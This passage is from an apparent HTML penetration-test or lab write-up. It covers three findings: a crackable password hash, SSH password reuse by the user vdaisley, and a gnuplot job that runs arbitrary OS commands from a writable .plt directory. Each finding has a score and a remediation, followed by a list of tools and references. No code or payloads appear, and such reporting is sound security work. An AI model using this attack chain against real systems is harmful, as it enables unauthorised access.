score</td><td id="BY@B" class="" style="width:653px"><strong>6.2</strong></td></tr><tr id="37c1f4f2-e7a1-493e-8076-07f0d6035e08"><td id="&lt;?AB" class="" style="width:653px">Severity</td><td id="BY@B" class="" style="width:653px"><strong><mark class="highlight-orange_background">MEDIUM</mark></strong></td></tr><tr id="7e5f585d-1389-4c73-b8de-a509599140f3"><td id="&lt;?AB" class="" style="width:653px">Attack vector</td><td id="BY@B" class="" style="width:653px"><strong>N/A</strong></td></tr><tr id="1d964ec2-00ce-44cf-b47a-ce67da817640"><td id="&lt;?AB" class="" style="width:653px">Impact</td><td id="BY@B" class="" style="width:653px">Allows an attacker to crack the password hash found with the previous vulnerability.<br/><br/>This has a <br/><strong><mark class="highlight-red">high</mark></strong> impact on the <strong><mark class="highlight-blue">confidentiality </mark></strong>of the affected component.</td></tr><tr id="2fdaf6f2-9293-480f-8b3a-7ac585b67d19"><td id="&lt;?AB" class="" style="width:653px">Remediation proposition</td><td id="BY@B" class="" style="width:653px">Set up a strong password policy</td></tr></tbody></table><h2 id="edbefe81-32b6-4157-9472-d31f797bd03b" class=""><mark class="highlight-blue">Password reuse</mark></h2><table id="dad78f8d-9446-4704-ae2d-e5fdd4b65127" class="simple-table"><thead class="simple-table-header"><tr id="a0837d2e-f25e-4562-81c4-fadf9fab9c6c"><th id="&lt;?AB" class="simple-table-header-color simple-table-header" style="width:653px">Field</th><th id="BY@B" class="simple-table-header-color simple-table-header" style="width:653px">Value</th></tr></thead><tbody><tr id="b729a811-6559-4d9f-8128-8067758fb11d"><td id="&lt;?AB" class="" style="width:653px">Affected component</td><td id="BY@B" class="" style="width:653px">Local system</td></tr><tr id="d9d17835-8aca-4901-b996-2d7b8c3075b0"><td id="&lt;?AB" class="" style="width:653px">CVSS 3.0 score</td><td id="BY@B" class="" style="width:653px"><strong>6.2</strong></td></tr><tr id="a48424e7-a08c-4e4c-b396-fe3844b2383a"><td id="&lt;?AB" class="" style="width:653px">Severity</td><td id="BY@B" class="" style="width:653px"><strong><mark class="highlight-orange_background">MEDIUM</mark></strong></td></tr><tr id="d0d90ebb-184b-4542-908b-559b9be52901"><td id="&lt;?AB" class="" style="width:653px">Attack vector</td><td id="BY@B" class="" style="width:653px"><strong>Network</strong></td></tr><tr id="a9f95bd5-b54c-477c-a3d4-beaf05693583"><td id="&lt;?AB" class="" style="width:653px">Impact</td><td id="BY@B" class="" style="width:653px">Allows an attacker to log in via SSH since the HTTP password is the same as the vdaisley local user password.<br/><br/>This has a <br/><mark class="highlight-red"><strong>high</strong></mark> impact on the <strong><mark class="highlight-blue">confidentiality </mark></strong>of the affected component.</td></tr><tr id="776b77d7-bf7c-4688-bb66-1e96a9bedb06"><td id="&lt;?AB" class="" style="width:653px">Remediation proposition</td><td id="BY@B" class="" style="width:653px">Set up a strong password policy</td></tr></tbody></table><h2 id="a82ceec0-7afe-43b7-ae05-c0d2d8147f8b" class=""><mark class="highlight-blue">Gnuplot job misconfiguration</mark></h2><table id="b0f9317a-48aa-4f7b-88b9-b09a2673ff7c" class="simple-table"><thead class="simple-table-header"><tr id="a5280076-d298-4f09-8388-7b42de53ce95"><th id="&lt;?AB" class="simple-table-header-color simple-table-header" style="width:653px">Field</th><th id="BY@B" class="simple-table-header-color simple-table-header" style="width:653px">Value</th></tr></thead><tbody><tr id="84a70002-0446-4723-9976-50ac1f4af3c4"><td id="&lt;?AB" class="" style="width:653px">Affected component</td><td id="BY@B" class="" style="width:653px">Local system</td></tr><tr id="07b4b63c-b74b-43c1-acf6-baed9844f930"><td id="&lt;?AB" class="" style="width:653px">CVSS 3.0 score</td><td id="BY@B" class="" style="width:653px"><strong>7.8</strong></td></tr><tr id="8303596f-424a-410f-896c-619493fa06ec"><td id="&lt;?AB" class="" style="width:653px">Severity</td><td id="BY@B" class="" style="width:653px"><mark class="highlight-red_background"><strong>HIGH</strong></mark></td></tr><tr id="70e4ed5c-0ec9-42a3-823e-7d6f3f9cc6e2"><td id="&lt;?AB" class="" style="width:653px">Attack vector</td><td id="BY@B" class="" style="width:653px"><strong>Local</strong></td></tr><tr id="fe9ee23a-adac-4d0c-a842-4a2b915e5387"><td id="&lt;?AB" class="" style="width:653px">Impact</td><td id="BY@B" class="" style="width:653px">Allows an attacker to execute a malicious .plt file leading to an arbitrary os command execution.<br/><br/>This has a <br/><strong><mark class="highlight-red">high</mark></strong> impact on the <mark class="highlight-blue"><strong>confidentiality</strong></mark><mark class="highlight-default">, </mark><mark class="highlight-blue"><strong>integrity</strong></mark><mark class="highlight-default">, and</mark><mark class="highlight-blue"> </mark><strong><mark class="highlight-blue">availability </mark></strong>of the affected component.</td></tr><tr id="03fd727f-dc9b-4898-8790-e9bc5315f324"><td id="&lt;?AB" class="" style="width:653px">Remediation proposition</td><td id="BY@B" class="" style="width:653px">If user vdaisley does not need write permissions in /opt/gnuplot, remove write permissions in this directory.<br/><br/>Else, set up a blacklist to avoid executing .plt files if they contain the system command.<br/></td></tr></tbody></table><h1 id="13df338f-8d68-4d27-aa6f-7e977557ffdd" class="">Tools used</h1><table id="bf8d2f32-27e5-4561-876b-07a72c1a705a" class="simple-table"><thead class="simple-table-header"><tr id="0ac20377-a73c-4e44-9c82-b24f63e387be"><th id="`&gt;MF" class="simple-table-header-color simple-table-header" style="width:653px">Tool</th><th id="A|qY" class="simple-table-header-color simple-table-header" style="width:653px">Purpose</th></tr></thead><tbody><tr id="d6108e45-d331-4976-8a09-71223437411d"><td id="`&gt;MF" class="" style="width:653px"><a href="https://nmap.org/book/man.html"><strong>Nmap</strong></a></td><td id="A|qY" class="" style="width:653px">- Scan for open ports<br/>- Scan services versions<br/></td></tr><tr id="cd74d8a4-f20e-4706-ad20-d96c3c21ec1a"><td id="`&gt;MF" class="" style="width:653px"><a href="https://github.com/OJ/gobuster"><strong>Gobuster</strong></a></td><td id="A|qY" class="" style="width:653px">- Fuzz virtual hosts</td></tr><tr id="46c831db-148e-468a-90fc-77b48c8bcaf1"><td id="`&gt;MF" class="" style="width:653px"><strong><a href="https://www.openwall.com/john/doc/">John</a></strong></td><td id="A|qY" class="" style="width:653px">- Crack password hashes</td></tr><tr id="b5fc2030-a856-4332-b1e9-8d93b01f97d3"><td id="`&gt;MF" class="" style="width:653px"><a href="https://github.com/DominicBreuker/pspy"><strong>Pspy</strong></a></td><td id="A|qY" class="" style="width:653px">- List running processes</td></tr></tbody></table><h1 id="1d304c86-af12-4e00-bbc1-c83a28d76854" class="">Sources</h1><ul id="4510b881-73c2-4afc-adb2-fd6be2f33987" class="bulleted-list"><li style="list-style-type:disc">LaTeX special characters : <a href="http://www.personal.ceu.hu/tex/specchar.htm">http://www.personal.ceu.hu/tex/specchar.htm</a></li></ul><ul id="7f942618-47a7-4e03-b04d-2ba50c0056c4" class="bulleted-list"><li style="list-style-type:disc">LaTeX injections : <a href="https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection">https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection</a></li></ul><ul id="869c1cf2-d6a9-4824-9424-c07bb639ff0c" class="bulleted-list"><li style="list-style-type:disc">Gnuplot system command : <a href="https://gnuplot.sourceforge.net/docs_4.2/node336.html">https://gnuplot.sourceforge.net/docs_4.2/node336.html</a></li></ul></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
